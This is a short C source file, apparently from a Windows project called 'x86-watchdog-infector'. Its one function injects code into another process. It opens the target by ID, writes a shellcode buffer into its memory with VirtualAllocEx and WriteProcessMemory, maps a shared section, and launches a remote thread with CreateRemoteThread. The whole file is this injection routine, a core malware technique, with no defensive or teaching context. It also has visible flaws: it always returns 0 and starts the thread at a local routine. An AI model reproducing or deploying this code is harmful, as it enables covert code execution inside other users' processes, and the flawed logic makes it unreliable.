#include <Windows.h>
#include <winternl.h>

#include "x86-watchdog-infector.h"

/* NTSYSAPI NTSTATUS
ZwMapViewOfSection(HANDLE SectionHandle,
                   HANDLE ProcessHandle,
                   PVOID* BaseAddress,
                   ULONG_PTR ZeroBits,
                   SIZE_T CommitSize,
                   PLARGE_INTEGER SectionOffset,
                   PSIZE_T ViewSize,
                   SECTION_INHERIT InheritDisposition,
                   ULONG AllocationType,
                   ULONG Win32Protect); */

int
infect_process(HANDLE section,
               PVOID shell_base,
               SIZE_T shell_size,
               DWORD proc_id,
               struct watchdog_info* map)
{
  int ret = 0;

  HANDLE proc =
    OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
                0,
                proc_id);
  if (proc == NULL) {
    return -1;
  }

  PVOID p_remote = VirtualAllocEx(
    proc, NULL, shell_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (p_remote == NULL) {
    ret = -2;
    goto close_proc;
  }

  if (!WriteProcessMemory(proc, p_remote, shell_base, shell_size, NULL)) {
    ret = -3;
    goto free_remote;
  }

  PVOID p_section = NULL;
  LARGE_INTEGER section_off;
  SIZE_T view_size;

  section_off.HighPart = 0;
  section_off.LowPart = sizeof *map;

  view_size = 0;

  if (!NT_SUCCESS(NtMapViewOfSection(section,
                                     proc,
                                     &p_section,
                                     0,
                                     0,
                                     &section_off,
                                     &view_size,
                                     /* ViewUnmap */ 2,
                                     SEC_COMMIT,
                                     PAGE_READWRITE))) {
    ret = -4;
    goto free_remote;
  }

  HANDLE thread =
    CreateRemoteThread(proc, NULL, 0, ThreadProc, p_section, 0, NULL);
  if (thread == NULL) {
    ret = -5;
    goto unmap_section;
  }

close_thread:
  CloseHandle(thread);
unmap_section:
  if (ret < 0) {
    NtUnmapViewOfSection(proc, p_section);
  }
free_remote:
  if (ret < 0) {
    VirtualFreeEx(proc, p_remote, 0, MEM_RELEASE);
  }
close_proc:
  CloseHandle(proc);

  return 0;
}
